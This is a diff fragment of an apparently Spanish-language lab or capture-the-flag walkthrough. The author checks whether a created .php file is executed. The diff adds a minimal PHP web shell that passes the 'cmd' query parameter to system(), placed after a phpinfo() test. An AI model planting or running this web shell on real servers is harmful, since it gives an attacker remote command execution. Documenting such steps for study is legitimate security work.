@@ -351,6 +351,19 @@ Y aqui intentamos creer un nuevo archivo .php
 ```
 <?php phpinfo(); ?>
 
+<pre>
+<?php
+
+    if(isset($_GET['cmd']))
+    {
+
+        system($_GET['cmd']);
+
+    }
+
+?>
+</pre>
+
 ```
 Vemos que esta interpretando codigo php 
 
